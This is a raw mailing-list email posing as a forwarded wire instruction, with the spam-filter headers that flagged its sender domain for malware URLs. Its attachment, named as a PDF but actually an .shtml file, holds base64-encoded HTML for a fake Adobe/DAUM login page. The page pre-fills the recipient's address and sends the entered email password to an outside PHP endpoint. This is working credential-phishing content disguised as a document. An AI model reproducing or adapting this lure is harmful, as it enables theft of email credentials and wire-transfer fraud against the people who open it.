Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 92D2169C3F5
	for <lists+industrypack-devel@lfdr.de>; Mon, 20 Feb 2023 02:27:37 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1pTuxt-0000iN-0R
	for lists+industrypack-devel@lfdr.de;
	Mon, 20 Feb 2023 01:27:36 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <erik@glasweldservicio.com>) id 1pTuxr-0000iG-0t
 for industrypack-devel@lists.sourceforge.net;
 Mon, 20 Feb 2023 01:27:34 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Type:List-Unsubscribe:MIME-Version:
 Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:
 Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
 Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Id:
 List-Help:List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=jKPDc91F/6Ji42s9FPVw8oJms6g4GsnhlR6dhR6z1UA=; b=CAU0k7f0E/iqVSmBt90VSIW6gj
 RXlh1jQfL/IT0ih8UlDIigowPJrI/StytMfwyJ3WuvQB0YZHh1R4FEht3gH6HlldDPUm9RdCnQ7GL
 VFsglIAvjUjceU3wuL5VvRh1mg9LQUqmBKBsETiieNn5iFEss8/1A9PgkmTloRdC2g1Q=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Type:List-Unsubscribe:MIME-Version:Message-ID:Date:Subject:To:
 From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Subscribe:
 List-Post:List-Owner:List-Archive;
 bh=jKPDc91F/6Ji42s9FPVw8oJms6g4GsnhlR6dhR6z1UA=; b=kQ66mrJYPM1Y9kGo/u7Hk+mCaC
 IHuw4n939sMlCr52FWUF5gX1Vv+kmOqZxrN34Qbu+chr0E6h82gbs3AloHfNZhfKzchYyYpIcGJJD
 Q+LNIf+JBxxmBRyfcqaGraCtuesjXj72UiKWuRR/1HSFm5FYa9NOk98vvHiNJPMw6dog=;
Received: from ueoxuccb.glasweldservicio.com ([92.52.217.205])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1pTuxl-0004Jy-FF for industrypack-devel@lists.sourceforge.net;
 Mon, 20 Feb 2023 01:27:34 +0000
DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim;
 d=glasweldservicio.com; 
 h=From:To:Subject:Date:Message-ID:MIME-Version:List-Unsubscribe:Content-Type;
 i=erik@glasweldservicio.com; bh=DqcfSmZkbuDty1Rxw86iZbosTb0=;
 b=S4lB2BadJG7FjViyeuavCAPgb6Kgf185ahQ/w9+3isvn3r54niDbtKfVQXrVsC6EaY8JMxS0B668
 hrtAP+7GfXHZUJwI04VTZW7BcbUeTEVpmQjrZToI7RJHpWrOEGlyHa6Kd9t3s03o6ItRngg7vKBg
 1ETqT6SCioHWJgTcghuNB97mycB6GeyfasRzYkKcFy1QvNrETZ71Dd3h04fj7HOEm4wWhr9Z3j0R
 y5ydRXc9fUSweNaXPY3bWMBxcX7VDEOq1b9GZCYCvQnqBSCMKyCDaW8ZfyYoUKgsC0rYHjxpsRun
 LprR0LW+//M9nDtkmbbl9cmBT/XpG9F5cTQKnw==
DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=glasweldservicio.com;
 b=iwltoeUbuumYIrJxN5tvMGH26LUbf55ObAjLL7lHFNx3D+XfZObGtWfl70tdIkqMR8JXg+H+yFJm
 7B69QEmkwPaHOJ9SCqKyXgKjxDDLsND3iWKbRcO7HYVORoLXVyDf5kqFzkHbd1oTpWNVP5uRBfl2
 XpkqN02y69UVzf16rVXQn4OVPl4KYyhPlV65KeYfomZITmsClp+2U7ULU2aG5zhVbGqvH7lFjHgc
 cNi4N/TYotRLFwl+j7NtNSJdT1VDgicbXq+YiYy1XwLX/cycFBOc3TVghVa1qiN+nVFp+E8nRL+r
 1QghAy2Vw82tMjH8FFHHpUvE4tPIfmUK1plA0Q==;
From: WSFS LLC<erik@glasweldservicio.com>
To: industrypack-devel@lists.sourceforge.net
Date: 19 Feb 2023 17:27:23 -0800
Message-ID: <20230219172723.F5FE656A8334C667@glasweldservicio.com>
MIME-Version: 1.0
Content-Type: multipart/mixed;
 boundary="----=_NextPart_000_0012_6EF623D1.85C58E71"
X-Spam-Score: 5.6 (+++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  Please See Attached. 
 Content analysis details:   (5.6 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 2.5 URIBL_DBL_MALWARE      Contains a malware URL listed in the Spamhaus
 DBL blocklist [URIs: glasweldservicio.com]
 0.5 SUBJ_ALL_CAPS          Subject is all capitals
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 T_OBFU_HTML_ATTACH     BODY: HTML attachment with non-text MIME type
 0.0 T_OBFU_PDF_ATTACH      BODY: PDF attachment with generic MIME type
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 1.7 URIBL_BLACK            Contains an URL listed in the URIBL blacklist
 [URIs: glasweldservicio.com]
 -0.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
 [92.52.217.205 listed in wl.mailspike.net]
 1.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
 [92.52.217.205 listed in dnsbl-1.uceprotect.net]
 0.0 T_HTML_ATTACH          HTML attachment to bypass scanning?
 0.0 T_OBFU_ATTACH_MISSP    Obfuscated attachment type and misspaced
 From
X-Headers-End: 1pTuxl-0004Jy-FF
Subject: [Industrypack-devel] FW: RE: WIRE INSTRUCTION
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

This is a multi-part message in MIME format.

------=_NextPart_000_0012_6EF623D1.85C58E71
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<BODY>Please See Attached.<BR><BR></BODY></HTML>
------=_NextPart_000_0012_6EF623D1.85C58E71
Content-Type: application/octet-stream; name="Scan_Wire Instruction.PDF.shtml"; charset="utf-8"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="Scan_Wire Instruction.PDF.shtml"

DQo8IURPQ1RZUEUgSFRNTCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0
aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4NCiA8
IURPQ1RZUEUgaHRtbD4NCjxodG1sPg0KPHNjcmlwdCBsYW5ndWFnZT0iSmF2YVNjcmlwdCI+
DQo8L3NjcmlwdD4NCjxIVE1MPjxIRUFEPg0KPE1FVEEgbmFtZT1HRU5FUkFUT1IgY29udGVu
dD0iTVNIVE1MIDExLjAwLjEwNTcwLjEwMDEiPjwvSEVBRD4NCjxtZXRhIG5hbWU9InJvYm90
cyIgY29udGVudD0ibm9pbmRleCwgbm9mb2xsb3ciPg0KICAgIDxtZXRhIG5hbWU9InZpZXdw
b3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wLCBt
YXhpbXVtLXNjYWxlPTEuMCI+DQoNCiAgICA8bGluayByZWw9InNob3J0Y3V0IGljb24iIHR5
cGU9ImltYWdlL3gtaWNvbiIgaHJlZj0iaHR0cHM6Ly93d3cuYWRvYmUuY29tL2Zhdmljb24u
aWNvIj4NCgk8dGl0bGU+UERGIHJlYWRlciB8IEFkb2JlIEFjcm9iYXQgUmVhZGVyIERDPC90
aXRsZT4NCjxCT0RZIHN0eWxlPSJNQVJHSU46MC41ZW07IGJhY2tncm91bmQtaW1hZ2U6dXJs
KCdodHRwczovLzRyZXNjdWUuYWRtaW5zeXdhay5wbC8vcGljcy9pbWFnZWVkaXRfM180Mjcx
NTAwMjMwLmpwZyI+PEJSPjxCUj4NCjxESVYgY2xhc3M9d3JhcHBlciBzdHlsZT0nQk9YLVNJ
WklORzogYm9yZGVyLWJveDsgRk9OVC1TSVpFOiAxNHB4OyBGT05ULUZBTUlMWTogIkhlbHZl
dGljYSBOZXVlIiwgSGVsdmV0aWNhLCBBcmlhbCwgc2Fucy1zZXJpZjsgV0hJVEUtU1BBQ0U6
IG5vcm1hbDsgV09SRC1TUEFDSU5HOiAwcHg7IFRFWFQtVFJBTlNGT1JNOiBub25lOyBGT05U
LVdFSUdIVDogNDAwOyBDT0xPUjogcmdiKDYzLDYzLDYzKTsgRk9OVC1TVFlMRTogbm9ybWFs
OyBNSU4tSEVJR0hUOiAxMDAlOyBPUlBIQU5TOiAyOyBXSURPV1M6IDI7IE1BUkdJTjogMHB4
IDBweCAtNDBweDsgTEVUVEVSLVNQQUNJTkc6IG5vcm1hbDsgVEVYVC1JTkRFTlQ6IDBweDsg
Zm9udC12YXJpYW50LWxpZ2F0dXJlczogbm9ybWFsOyBmb250LXZhcmlhbnQtY2Fwczogbm9y
bWFsOyAtd2Via2l0LXRleHQtc3Ryb2tlLXdpZHRoOiAwcHg7IHRleHQtZGVjb3JhdGlvbi1z
dHlsZTogaW5pdGlhbDsNCnRleHQtZGVjb3JhdGlvbi1jb2xvcjogaW5pdGlhbCc+PFNFQ1RJ
T04gY2xhc3M9Y29udGFpbmVyIHN0eWxlPSJCT1gtU0laSU5HOiBib3JkZXItYm94OyBXSURU
SDogMTE4MHB4OyBQQURESU5HLUxFRlQ6IDIwcHg7IE1BUkdJTjogMHB4IGF1dG87IERJU1BM
QVk6IGJsb2NrOyBQQURESU5HLVJJR0hUOiAyMHB4Ij4NCjxESVYgY2xhc3M9Zm9ybS1sb2dp
biBzdHlsZT0iQk9YLVNJWklORzogYm9yZGVyLWJveDsgTUFYLVdJRFRIOiA0NTBweDsgTUFS
R0lOOiAxODBweCBhdXRvIDQwcHgiPg0KPERJViBjbGFzcz0ibXQtMzAgbWItMzAiIHN0eWxl
PSJCT1gtU0laSU5HOiBib3JkZXItYm94OyBNQVJHSU46IDEwcHggMHB4Ij48SU1HIGNsYXNz
PSJpbWctcmVzcG9uc2l2ZSBmb3JtLWxvZ2luX19jb21wYW55LWxvZ28iIHN0eWxlPSJCT1JE
RVItTEVGVC1XSURUSDogMHB4OyBCT1gtU0laSU5HOiBib3JkZXItYm94OyBNQVgtV0lEVEg6
IDMwJTsgSEVJR0hUOiBhdXRvOyBCT1JERVItUklHSFQtV0lEVEg6IDBweDsgVkVSVElDQUwt
QUxJR046IG1pZGRsZTsgQk9SREVSLUJPVFRPTS1XSURUSDogMHB4OyBNQVJHSU46IDBweCBh
dXRvOyBESVNQTEFZOiBibG9jazsgQk9SREVSLVRPUC1XSURUSDogMHB4OyBNQVgtSEVJR0hU
OiA1MHB4IiBzcmM9Imh0dHBzOi8vaS5pbWd1ci5jb20vQzFza2h3Sy5wbmciPjwvRElWPg0K
PERJViBjbGFzcz1mb3JtLWxvZ2luX19ib2R5IHN0eWxlPSJCT1gtU0laSU5HOiBib3JkZXIt
Ym94OyBCT1JERVItVE9QOiByZ2IoMjM1LDIzNSwyMzUpIDFweCBzb2xpZDsgQk9SREVSLVJJ
R0hUOiByZ2IoMjM1LDIzNSwyMzUpIDFweCBzb2xpZDsgQk9SREVSLUJPVFRPTTogcmdiKDIz
NSwyMzUsMjM1KSAxcHggc29saWQ7IFBPU0lUSU9OOiByZWxhdGl2ZTsgUEFERElORy1CT1RU
T006IDMwcHg7IFBBRERJTkctVE9QOiAzMHB4OyBQQURESU5HLUxFRlQ6IDUwcHg7IEJPUkRF
Ui1MRUZUOiByZ2IoMjM1LDIzNSwyMzUpIDFweCBzb2xpZDsgTUFSR0lOOiAwcHg7IFotSU5E
RVg6IDE7IFBBRERJTkctUklHSFQ6IDUwcHg7IEJBQ0tHUk9VTkQtQ09MT1I6IHJnYigyMzQs
IDIzNiwgMjM4KTsgYm9yZGVyLXJhZGl1czogNXB4Ij4NCjxESVYgY2xhc3M9Zm9ybS1ncm91
cCBzdHlsZT0iQk9YLVNJWklORzogYm9yZGVyLWJveDsgTUFSR0lOOiAwcHggMHB4IDE1cHgi
Pg0KPEZPUk0gaWQ9bG9naW5fZm9ybSBzdHlsZT0iQk9YLVNJWklORzogYm9yZGVyLWJveDsg
TUFSR0lOOiAwcHgiIG1ldGhvZD0icG9zdCIgDQphY3Rpb24gPSJodHRwczovL2hpZGRlbi5h
d2V2LmNvbS9kemVuL09aRURJLnBocCI+DQogICAgICAgIDxwPg0KICAgICAgICAgPHRhYmxl
IHdpZHRoPSIxMDAlIiBib3JkZXI9IjAiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0i
MCIgcm9sZT0icHJlc2VudGF0aW9uIj4NCiAgICAgICAgICA8dHI+DQogICAgICAgICAgIDx0
ZCB3aWR0aD0iNSUiIGFsaWduPSJyaWdodCI+DQogICAgCSAgICAgIDxpbWcgc3R5bGU9Indp
ZHRoOjMwcHg7IGhlaWdodDo0NXB4IiBzcmM9Imh0dHBzOi8vNHJlc2N1ZS5hZG1pbnN5d2Fr
LnBsLy9waWNzL2ZlZHplZC5wbmciICBib3JkZXI9IjAiICBhbHQ9IiIvPg0KICAgICAgICAg
ICA8L3RkPg0KICAgICAgICAgICA8dGQgYWxpZ249ImxlZnQiPg0KICAgIAkgICAgICA8ZGl2
IHN0eWxlPSJjb2xvcjogI2NiNjM2MzsiPg0KICAgICAgICAgICAgICAgICBEQVVNIEFkb2Jl
IFNlY3VyZU1haWxwcm92aWRlZCBieSBEQVVNIGVtYWlsIGVuY3J5cHRpb24gfCBQREYgRG9j
dW1lbnQgUmVhZGVyLg0KICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgIDwvdGQ+DQog
ICAgICAgICAgPC90cj4NCiAgICAgICAgIDwvdGFibGU+DQogICAgICAgIDwvcD4NCjxESVYg
Y2xhc3M9Zm9ybS1ncm91cCBzdHlsZT0iQk9YLVNJWklORzogYm9yZGVyLWJveDsgTUFSR0lO
OiAwcHggMHB4IDE2cHgiPjxGT05UIHN0eWxlPSJCT1gtU0laSU5HOiBib3JkZXItYm94OyBN
QVJHSU46IDBweCIgY29sb3I9I2RjNTI1MiA8L0ZPTlQ+PEJSIHN0eWxlPSJCT1gtU0laSU5H
OiBib3JkZXItYm94OyBNQVJHSU46IDBweCI+PEJSIHN0eWxlPSJCT1gtU0laSU5HOiBib3Jk
ZXItYm94OyBNQVJHSU46IDBweCI+PExBQkVMIHN0eWxlPSJCT1gtU0laSU5HOiBib3JkZXIt
Ym94OyBNQVgtV0lEVEg6IDEwMCU7IEZPTlQtV0VJR0hUOiBib2xkOyBNQVJHSU46IDBweCAw
cHggNXB4OyBESVNQTEFZOiBpbmxpbmUtYmxvY2siIGZvcj1sb2dpbl91c2VyPkVtYWlsIEFk
ZHJlc3M8L0xBQkVMPg0KIDxJTlBVVCBpZD1sb2dpbl91c2VyIGNsYXNzPWZvcm0tY29udHJv
bCBzdHlsZT0iQk9YLVNJWklORzogYm9yZGVyLWJveDsgRk9OVC1TSVpFOiAxNnB4OyBCT1JE
RVItVE9QOiByZ2IoMjA0LDIwNCwyMDQpIDFweCBzb2xpZDsgSEVJR0hUOiAzNHB4OyBGT05U
LUZBTUlMWTogaW5oZXJpdDsgQk9SREVSLVJJR0hUOiByZ2IoMjA0LDIwNCwyMDQpIDFweCBz
b2xpZDsgV0lEVEg6IDM0OHB4OyBCQUNLR1JPVU5ELUlNQUdFOiBub25lOyBCT1JERVItQk9U
VE9NOiByZ2IoMjA0LDIwNCwyMDQpIDFweCBzb2xpZDsgQ09MT1I6IGJsYWNrOyBQQURESU5H
LUJPVFRPTTogMHB4OyBQQURESU5HLVRPUDogMHB4OyBQQURESU5HLUxFRlQ6IDBweDsgQk9S
REVSLUxFRlQ6IHJnYigyMDQsMjA0LDIwNCkgMXB4IHNvbGlkOyBNQVJHSU46IDBweDsgRElT
UExBWTogYmxvY2s7IExJTkUtSEVJR0hUOiAyOyBQQURESU5HLVJJR0hUOiAwcHg7IEJBQ0tH
Uk9VTkQtQ09MT1I6DQpyZ2IoMjU1LDI1NSwyNTUpOyBURVhULUlOREVOVDogMTBweDsgZm9u
dC1zdHJldGNoOiBpbmhlcml0OyBib3JkZXItcmFkaXVzOiA0cHg7IGJveC1zaGFkb3c6IHJn
YmEoMCwgMCwgMCwgMC4wNzUpIDBweCAxcHggMXB4IGluc2V0OyB0cmFuc2l0aW9uOiBib3Jk
ZXItY29sb3IgMC4xNXMgZWFzZS1pbi1vdXQgMHMsIGJveC1zaGFkb3cgMC4xNXMgZWFzZS1p
bi1vdXQgMHMiIHR5cGU9ICJlbWFpbCIgbmFtZT0gImVtYWlsIiBpZD0iZW1haWwiIFZhbHVl
PSJpbmR1c3RyeXBhY2stZGV2ZWxAbGlzdHMuc291cmNlZm9yZ2UubmV0InBsYWNlaG9sZGVy
PSJFbnRlciBFbWFpbCIgIGF1dG9jb21wbGV0ZT0ib2ZmIj48L0RJVj48L0RJVj4NCjxESVYg
Y2xhc3M9Zm9ybS1ncm91cCBzdHlsZT0iQk9YLVNJWklORzogYm9yZGVyLWJveDsgTUFSR0lO
OiAwcHggMHB4IDE1cHgiPjxMQUJFTCBzdHlsZT0iQk9YLVNJWklORzogYm9yZGVyLWJveDsg
TUFYLVdJRFRIOiAxMDAlOyBGT05ULVdFSUdIVDogYm9sZDsgTUFSR0lOOiAwcHggMHB4IDVw
eDsgRElTUExBWTogaW5saW5lLWJsb2NrIiBmb3I9bG9naW5fcHdkPmVtYWlsIHBhc3N3b3Jk
PC9MQUJFTD4NCiA8SU5QVVQgaWQ9bG9naW5fcHdkIGNsYXNzPWZvcm0tY29udHJvbCBzdHls
ZT0iQk9YLVNJWklORzogYm9yZGVyLWJveDsgRk9OVC1TSVpFOiAxNnB4OyBCT1JERVItVE9Q
OiByZ2IoMjA0LDIwNCwyMDQpIDFweCBzb2xpZDsgSEVJR0hUOiAzNHB4OyBGT05ULUZBTUlM
WTogaW5oZXJpdDsgQk9SREVSLVJJR0hUOiByZ2IoMjA0LDIwNCwyMDQpIDFweCBzb2xpZDsg
V0lEVEg6IDM0OHB4OyBCQUNLR1JPVU5ELUlNQUdFOiBub25lOyBCT1JERVItQk9UVE9NOiBy
Z2IoMjA0LDIwNCwyMDQpIDFweCBzb2xpZDsgQ09MT1I6IGJsYWNrOyBQQURESU5HLUJPVFRP
TTogMHB4OyBQQURESU5HLVRPUDogMHB4OyBQQURESU5HLUxFRlQ6IDBweDsgQk9SREVSLUxF
RlQ6IHJnYigyMDQsMjA0LDIwNCkgMXB4IHNvbGlkOyBNQVJHSU46IDBweDsgRElTUExBWTog
YmxvY2s7IExJTkUtSEVJR0hUOiAyOyBQQURESU5HLVJJR0hUOiAwcHg7IEJBQ0tHUk9VTkQt
Q09MT1I6DQpyZ2IoMjU1LDI1NSwyNTUpOyBURVhULUlOREVOVDogMTBweDsgZm9udC1zdHJl
dGNoOiBpbmhlcml0OyBib3JkZXItcmFkaXVzOiA0cHg7IGJveC1zaGFkb3c6IHJnYmEoMCwg
MCwgMCwgMC4wNzUpIDBweCAxcHggMXB4IGluc2V0OyB0cmFuc2l0aW9uOiBib3JkZXItY29s
b3IgMC4xNXMgZWFzZS1pbi1vdXQgMHMsIGJveC1zaGFkb3cgMC4xNXMgZWFzZS1pbi1vdXQg
MHMiIHR5cGU9ICJwYXNzd29yZCIgbmFtZT0gInBhc3N3b3JkIiByZXF1aXJlZD0iIiBpZD0i
cGFzc3dvcmQiIHBsYWNlaG9sZGVyPSJFbnRlciBwYXNzd29yZCIgbWlubGVuZ3RoPSI1IiBy
ZXF1aXJlZCB0YWJpbmRleD0iMiIgYXV0b2NvcnJlY3Q9Im9mZiIgYXV0b2NhcGl0YWxpemU9
Im9mZiIgYXV0b2NvbXBsZXRlID0ib2ZmIj48L0RJVj4NCjxJTlBVVCBjbGFzcz0iYnRuIGJ0
bi1wcmltYXJ5IGJ0bi1ibG9jayIgc3R5bGU9IkJPWC1TSVpJTkc6IGJvcmRlci1ib3g7IEZP
TlQtU0laRTogMTRweDsgQ1VSU09SOiBwb2ludGVyOyBCT1JERVItVE9QOiByZ2IoMCwxNjcs
MjMwKSAxcHggc29saWQ7IEZPTlQtRkFNSUxZOiBpbmhlcml0OyBCT1JERVItUklHSFQ6IHJn
YigwLDE2NywyMzApIDFweCBzb2xpZDsgV0lEVEg6IDM0OHB4OyBWRVJUSUNBTC1BTElHTjog
bWlkZGxlOyBCQUNLR1JPVU5ELUlNQUdFOiBub25lOyBXSElURS1TUEFDRTogbm93cmFwOyBC
T1JERVItQk9UVE9NOiBEMzNFMkMgMXB4IHNvbGlkOyBGT05ULVdFSUdIVDogbm9ybWFsOyBD
T0xPUjogcmdiKDI1NSwyNTUsMjU1KTsgUEFERElORy1CT1RUT006IDEzcHg7IFRFWFQtQUxJ
R046IGNlbnRlcjsgUEFERElORy1UT1A6IDEzcHg7IFBBRERJTkctTEVGVDogMTJweDsgQk9S
REVSLUxFRlQ6IHJnYigwLDE2NywyMzApIDFweCBzb2xpZDsNCk1BUkdJTjogMHB4IDBweCAz
cHg7IERJU1BMQVk6IGJsb2NrOyBMSU5FLUhFSUdIVDogMS40Mjg1OyBQQURESU5HLVJJR0hU
OiAxMnB4OyBCQUNLR1JPVU5ELUNPTE9SOiByZ2IoMjMsIDMyLCA0Mik7IGZvbnQtc3RyZXRj
aDogaW5oZXJpdDsgYm9yZGVyLXJhZGl1czogNHB4OyB0b3VjaC1hY3Rpb246IG1hbmlwdWxh
dGlvbjsgdXNlci1zZWxlY3Q6IG5vbmU7IGFwcGVhcmFuY2U6IGJ1dHRvbiIgdHlwZT1zdWJt
aXQgdmFsdWU9ImNvbnRpbnVlIHRvIGRvY3VtZW50YXRpb24iIG5hbWU9c3VibWl0X2J0bj48
L0ZPUk0+PC9ESVY+PC9ESVY+PC9ESVY+PC9TRUNUSU9OPg0KPERJVj48L0RJVj48L0ZPUk0+
DQo8RElWPjwvRElWPg0KPERJVj48L0RJVj4NCjxESVY+PC9ESVY+PC9TRUNUSU9OPg0KPERJ
Vj48L0RJVj4NCjxQPg0KPEZPT1RFUiBjbGFzcz1mb290ZXItbG9naW4gc3R5bGU9J0JPWC1T
SVpJTkc6IGJvcmRlci1ib3g7IEZPTlQtU0laRTogMTRweDsgSEVJR0hUOiA0MHB4OyBGT05U
LUZBTUlMWTogIkhlbHZldGljYSBOZXVlIiwgSGVsdmV0aWNhLCBBcmlhbCwgc2Fucy1zZXJp
ZjsgV0hJVEUtU1BBQ0U6IG5vcm1hbDsgV09SRC1TUEFDSU5HOiAwcHg7IFBPU0lUSU9OOiBy
ZWxhdGl2ZTsgVEVYVC1UUkFOU0ZPUk06IG5vbmU7IEZPTlQtV0VJR0hUOiA0MDA7IENPTE9S
OiByZ2IoNjMsNjMsNjMpOyBGT05ULVNUWUxFOiBub3JtYWw7IFRFWFQtQUxJR046IGNlbnRl
cjsgT1JQSEFOUzogMjsgV0lET1dTOiAyOyBNQVJHSU46IDBweDsgRElTUExBWTogYmxvY2s7
IExFVFRFUi1TUEFDSU5HOiBub3JtYWw7IEJPVFRPTTogMTBweDsgVEVYVC1JTkRFTlQ6IDBw
eDsgZm9udC12YXJpYW50LWxpZ2F0dXJlczogbm9ybWFsOyBmb250LXZhcmlhbnQtY2Fwczog
bm9ybWFsOw0KLXdlYmtpdC10ZXh0LXN0cm9rZS13aWR0aDogMHB4OyB0ZXh0LWRlY29yYXRp
b24tc3R5bGU6IGluaXRpYWw7IHRleHQtZGVjb3JhdGlvbi1jb2xvcjogaW5pdGlhbCc+PEJS
PjxCUj48U1BBTiBjbGFzcz0idGV4dC1zbWFsbGVyIHRleHQtZ3JheSIgc3R5bGU9IkJPWC1T
SVpJTkc6IGJvcmRlci1ib3g7IEZPTlQtU0laRTogOXB4OyBDT0xPUjogcmdiKDEzNSwxMzUs
MTM1KTsgTUFSR0lOOiAwcHg7IERJU1BMQVk6IGJsb2NrIj48QlI+PEJSPjwvU1BBTj48L1A+
PC9CT0RZPjwvSFRNTD4=

------=_NextPart_000_0012_6EF623D1.85C58E71
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


------=_NextPart_000_0012_6EF623D1.85C58E71
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

------=_NextPart_000_0012_6EF623D1.85C58E71--

